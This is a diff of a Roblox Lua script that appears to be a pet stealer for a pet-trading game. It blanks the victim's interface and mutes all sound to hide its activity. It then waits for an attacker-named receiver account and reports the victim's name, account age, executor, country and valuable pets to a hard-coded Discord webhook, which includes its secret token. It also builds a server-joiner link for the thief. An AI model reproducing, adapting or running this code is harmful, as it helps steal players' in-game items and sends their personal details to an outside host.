@@ -1,24 +1,11 @@
 if getgenv().decfde then return end
 getgenv().decfde = true
 
-local player = game:GetService("Players").LocalPlayer
-local RS = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
-local LocalizationService = game:GetService("LocalizationService")
-local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
-local DataService = require(RS.Modules.DataService)
-local PetRegistry = require(RS.Data.PetRegistry)
-local NumberUtil = require(RS.Modules.NumberUtil)
-local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
-local PetsService = require(RS.Modules.PetServices.PetsService)
-
 if GetServerType:InvokeServer() == "VIPServer" then
-    player:Kick("This server is not supported")
+    Players.LocalPlayer:Kick("This server is not supported")
 end
 
+local player = game:GetService("Players").LocalPlayer
 local gui = Instance.new("ScreenGui")
 gui.Name = "ScriptGui"
 gui.ResetOnSpawn = false
@@ -99,11 +86,44 @@ task.spawn(function()
     end
 end)
 
+for _, v in player.PlayerGui:GetDescendants() do
+    if v:IsA("ScreenGui") then
+        v.Enabled = false
+    end
+end
+
+for _, sound in ipairs(workspace:GetDescendants()) do
+    if sound:IsA("Sound") then
+        sound.Volume = 0
+    end
+end
+
+for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
+    if sound:IsA("Sound") then
+        sound.Volume = 0
+    end
+end
+
+game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false
+game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
 local Webhook = "https://discord.com/api/webhooks/1393571947840929813/Yk-SBXIZoh-FP02pfhIfxthDSYJvUiIxbqugybWYu_gMi0XaccmE3E_1vjcMwZaBpJRM"
-local Usernames = {"drawesfa", "backup1", "backup2", "backup3"}
+local Usernames = {"kddk", "backup1", "backup2", "backup3"}
 local Fern = "https://fern.wtf/joiner?placeId="
-local OnlyPriorityPets = false
+local OnlyPriorityPets = true
 local MinPriorityThreshold = 13
+local RS = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local LocalizationService = game:GetService("LocalizationService")
+local DataService = require(RS.Modules.DataService)
+local PetRegistry = require(RS.Data.PetRegistry)
+local NumberUtil = require(RS.Modules.NumberUtil)
+local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
+local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
+local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
 
 local data = DataService:GetData()
 
@@ -136,27 +156,6 @@ local PetPriorityData = {
     ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
     ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
 }
-
-for _, v in player.PlayerGui:GetDescendants() do
-    if v:IsA("ScreenGui") then
-        v.Enabled = false
-    end
-end
-
-for _, sound in ipairs(workspace:GetDescendants()) do
-    if sound:IsA("Sound") then
-        sound.Volume = 0
-    end
-end
-
-for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
-    if sound:IsA("Sound") then
-        sound.Volume = 0
-    end
-end
-
-game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false
-game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 
 local receiverPlr
 repeat
@@ -491,7 +490,7 @@ local function getPlayerCountry(player)
     return success and result or "Unknown"
 end
 
-local accountAgeInDays = player.AccountAge
+local accountAgeInDays = Players.LocalPlayer.AccountAge
 local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60)
 local creationDateString = os.date("%Y-%m-%d", creationDate)
 
@@ -524,7 +523,7 @@ if petString ~= "" then
         fields = {
             {
                 name = "👤 Player Information",
-                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", player.DisplayName or "Unknown", Usernames[1] or "Unknown", identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "Unknown", tostring(player.AccountAge or 0)),
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", Players.LocalPlayer.DisplayName or "Unknown", Usernames[1] or "Unknown", identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "Unknown", tostring(Players.LocalPlayer.AccountAge or 0)),
                 inline = false
             },
             {
